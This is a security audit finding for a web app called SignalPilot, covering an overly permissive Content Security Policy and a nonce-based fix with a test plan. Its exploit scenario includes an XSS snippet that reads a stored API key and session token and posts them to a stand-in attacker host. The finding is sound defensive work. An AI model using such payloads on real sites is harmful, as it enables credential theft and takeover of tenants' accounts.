# `script-src` includes `'unsafe-inline' 'unsafe-eval'` in production

- Slug: csp-allows-unsafe-inline-and-unsafe-eval
- Severity: High
- Cloud impact: Yes
- Confidence: High
- Affected files / endpoints: `signalpilot/web/middleware.ts:29`

Back to [issues.md](issues.md)

---

## Problem

The Content Security Policy applied to all responses includes both `'unsafe-inline'` and `'unsafe-eval'` in `script-src` for every deployment, including production cloud:

```typescript
// middleware.ts:29
let scriptSrc = "'self' 'unsafe-inline' 'unsafe-eval'";
```

These directives are never conditionally removed in cloud mode. As the Clerk sources and SignalPilot domains are added in cloud mode (line 41), the base `'unsafe-inline' 'unsafe-eval'` remains.

The purpose of `Content-Security-Policy` is to prevent cross-site scripting (XSS) by blocking the execution of injected scripts. Both directives completely undermine this protection:

- `'unsafe-inline'`: Any HTML injection (e.g., `<script>maliciousCode()</script>`) or injected event handler (`<img onerror="maliciousCode()">`) executes without restriction.
- `'unsafe-eval'`: `eval()`, `new Function()`, `setTimeout(string)`, and `setInterval(string)` all execute arbitrary strings as JavaScript. If any tenant-controlled data reaches these call sites, it is RCE in the browser.

SignalPilot renders tenant-controlled data in several places:
- Query results (table cells may contain HTML if not escaped).
- Sandbox output HTML (see finding [sandbox-output-html-rendered-with-dangerouslysetinnerhtml](sandbox-output-html-rendered-with-dangerously-set-inner-html-proposal.md)).
- Connection names, labels, and user-supplied metadata.

With `'unsafe-inline'` in the CSP, any XSS vector in these surfaces leads immediately to session token theft, API key exfiltration, and Clerk JWT capture.

---

## Impact

- **CSP is effectively disabled.** Any HTML injection in any part of the application results in script execution.
- **Session token theft:** Clerk JWT stored in `__session` cookie is `HttpOnly`, but the Clerk SDK exposes it via JavaScript APIs. An XSS can call `Clerk.session.getToken()` and exfiltrate the JWT.
- **API key theft:** `localStorage.sp_api_key` is directly accessible to XSS (see finding [localstorage-stores-api-key-vulnerable-to-xss](localstorage-stores-api-key-vulnerable-to-xss-proposal.md)).
- **Multi-tenant blast radius:** XSS in one user's session can exfiltrate credentials that give access to their entire org's data.

---

## Exploit scenario

1. Attacker finds an XSS vector — e.g., a query result column containing `<img src=x onerror="payload()">` that is not properly escaped in a table cell.
2. Victim (org admin) runs a query that returns the attacker's crafted HTML.
3. The table cell renders the HTML. With `'unsafe-inline'` CSP, the `onerror` fires:

```javascript
// XSS payload:
const key = localStorage.getItem('sp_api_key');
const token = await window.Clerk.session.getToken();
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ key, token })
});
```

4. Attacker receives the victim's API key and Clerk JWT.
5. Attacker uses the API key to access the org's data indefinitely.

This scenario works even if the query result sanitizer is in place — `'unsafe-inline'` makes any injection point exploitable.

---

## Affected surface

- Files: `signalpilot/web/middleware.ts:29`
- Endpoints: All pages served by Next.js
- Auth modes: Cloud mode (primarily); local mode (lower risk, fewer attack surfaces)

---

## Proposed fix

Move to a nonce-based CSP:

```typescript
// middleware.ts — generate per-request nonce:
import { NextResponse } from "next/server";
import crypto from "crypto";

export function middleware(request: NextRequest): NextResponse {
  const nonce = crypto.randomBytes(16).toString("base64");
  const response = NextResponse.next({
    request: {
      headers: new Headers({
        ...Object.fromEntries(request.headers),
        "x-nonce": nonce,
      }),
    },
  });

  // Use nonce instead of 'unsafe-inline'
  const scriptSrc = `'self' 'nonce-${nonce}' 'strict-dynamic'`;
  // Remove 'unsafe-eval' — audit dependencies for eval usage first
  ...
}
```

In `app/layout.tsx` (and any other server component that renders `<script>` tags):

```tsx
import { headers } from "next/headers";

const nonce = headers().get("x-nonce") ?? "";
// Pass nonce to script tags and third-party scripts
<Script nonce={nonce} src="..." />
```

For `'unsafe-eval'`: audit the dependency tree:
1. Check if `recharts`, `xterm`, or other heavy UI libraries use `eval`. Most modern versions do not.
2. Check if Clerk's SDK uses `eval` (it should not in production builds).
3. If no legitimate `eval` usage is found, drop `'unsafe-eval'` entirely.

**Phased approach:**
1. Phase 1: Remove `'unsafe-eval'` (lower risk — if this breaks something, it's a bug in a dependency to fix).
2. Phase 2: Implement nonce-based `script-src`, drop `'unsafe-inline'`.

---

## Verification / test plan

**Automated:**
1. Use `csp-evaluator.withgoogle.com` on the production CSP — verify no `unsafe-*` flags reported.
2. Add a test that asserts the CSP header does not contain `'unsafe-inline'` or `'unsafe-eval'`.

**Manual checklist:**
- After removing `'unsafe-inline'`: inject `<script>alert(1)</script>` via a query result (if not sanitized). Verify browser does NOT execute it (CSP block reported in console).
- Verify Clerk authentication still works (Clerk's hosted JS should be covered by the `strict-dynamic` + nonce or explicit domain allowlist).
- Verify recharts and xterm still render correctly.

---

## Rollout / migration notes

- **High risk of breakage.** Test thoroughly in staging before production.
- Third-party scripts (Clerk, Cloudflare Turnstile) may require adding their domains to `script-src` explicitly when `'unsafe-inline'` is removed.
- Clerk's component library uses inline styles — `style-src` currently includes `'unsafe-inline'`; this is acceptable since CSS injection is lower risk than JS injection. Focus on `script-src`.
- `'strict-dynamic'` is not supported in old browsers; nonce-based CSP degrades gracefully (older browsers accept `'unsafe-inline'` as a fallback via the `'strict-dynamic'` fallback mechanism — confirm desired behavior).
- Rollback: restore `'unsafe-inline' 'unsafe-eval'` — immediate fallback, no data impact.

**Related findings:** [sandbox-output-html-rendered-with-dangerouslysetinnerhtml](sandbox-output-html-rendered-with-dangerously-set-inner-html-proposal.md), [localstorage-stores-api-key-vulnerable-to-xss](localstorage-stores-api-key-vulnerable-to-xss-proposal.md)
